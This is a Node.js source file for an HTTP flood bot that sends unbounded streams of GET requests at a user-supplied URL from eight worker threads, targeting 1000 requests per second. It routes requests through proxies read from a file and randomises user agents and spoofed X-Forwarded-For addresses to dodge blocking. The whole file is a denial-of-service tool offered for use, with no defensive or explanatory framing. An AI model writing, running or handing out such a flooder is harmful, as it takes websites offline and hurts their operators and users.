const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const http = require('http');
const https = require('https');
const fs = require('fs').promises;
const { URL } = require('url');

const PROXY_FILE_PATH = 'proxy.txt';
const TARGET_RPS = 1000;
const NUM_WORKERS = 8;
const REQUEST_INTERVAL_MS = 1000 / (TARGET_RPS / NUM_WORKERS);
const REPORT_INTERVAL_MS = 1000;
const REQUEST_TIMEOUT = 3000;

let proxies = [];
let requestCounter = 0;
let lastReportTime = Date.now();
let targetUrl = '';
let reportIntervalId = null;

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
];

const getRandomHeaders = () => ({
  'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.5',
  'Accept-Encoding': 'gzip, deflate',
  'Connection': 'keep-alive',
  'Upgrade-Insecure-Requests': '1',
  'Cache-Control': 'no-cache',
  'Pragma': 'no-cache',
  'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
});

async function fetchProxies() {
  try {
    const fileContent = await fs.readFile(PROXY_FILE_PATH, 'utf8');
    proxies = fileContent.split('\n').filter(line => line.trim()).map(line => {
      const [ip, port] = line.trim().split(':');
      return { ip, port, type: 'http' };
    });
    if (!proxies.length) {
      console.error('No proxies found in proxy.txt. Exiting.');
      process.exit(1);
    }
  } catch {
    console.error('Failed to read proxy.txt. Exiting.');
    process.exit(1);
  }
}

function makeRequest(targetUrl, proxy, callback) {
  const parsedUrl = new URL(targetUrl);
  const protocol = parsedUrl.protocol === 'https:' ? https : http;
  const options = {
    hostname: parsedUrl.hostname,
    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
    path: parsedUrl.pathname + (parsedUrl.search || ''),
    method: 'GET',
    headers: getRandomHeaders(),
    timeout: REQUEST_TIMEOUT,
    agent: new (parsedUrl.protocol === 'https:' ? https.Agent : http.Agent)({
      proxy: {
        host: proxy.ip,
        port: proxy.port
      }
    })
  };

  const req = protocol.request(options, (res) => {
    res.on('data', () => {});
    res.on('end', () => callback());
  });

  req.on('error', () => callback());
  req.on('timeout', () => {
    req.destroy();
    callback();
  });

  req.end();
}

if (!isMainThread) {
  const { url, proxies, workerId } = workerData;

  async function runWorker() {
    while (true) {
      const proxy = proxies[Math.floor(Math.random() * proxies.length)];
      makeRequest(url, proxy, () => {
        parentPort.postMessage({ type: 'request', workerId });
      });
      await new Promise(resolve => setTimeout(resolve, REQUEST_INTERVAL_MS));
    }
  }

  runWorker().catch(() => {});
  return;
}

async function flood(url) {
  await fetchProxies();
  targetUrl = url;
  requestCounter = 0;
  lastReportTime = Date.now();

  reportIntervalId = setInterval(() => {
    const currentTime = Date.now();
    const duration = (currentTime - lastReportTime) / 1000;
    const rps = duration > 0 ? (requestCounter / duration).toFixed(2) : 0;
    console.log(`RPS: ${rps}`);
    requestCounter = 0;
    lastReportTime = currentTime;
  }, REPORT_INTERVAL_MS);

  const workers = [];
  const workerPromises = [];

  for (let i = 0; i < NUM_WORKERS; i++) {
    const workerId = i + 1;
    const worker = new Worker(__filename, {
      workerData: { url, proxies, workerId }
    });

    workers.push(worker);
    workerPromises.push(new Promise((resolve) => {
      worker.on('message', (message) => {
        if (message.type === 'request') {
          requestCounter++;
        }
      });
      worker.on('error', () => resolve());
      worker.on('exit', () => resolve());
    }));
  }

  await Promise.all(workerPromises);
  clearInterval(reportIntervalId);
}

if (isMainThread) {
  (async () => {
    const args = process.argv.slice(2);

    if (!args.length || args[0] === '--help') {
      console.log('Usage: node bot.js <target_url>');
      console.log('Example: node bot.js https://example.com');
      console.log('Proxies from: proxy.txt (format: ip:port)');
      process.exit(0);
    }

    targetUrl = args[0];

    try {
      new URL(targetUrl);
    } catch {
      console.error('Invalid URL. Include http:// or https://');
      process.exit(1);
    }

    await flood(targetUrl);
  })();
}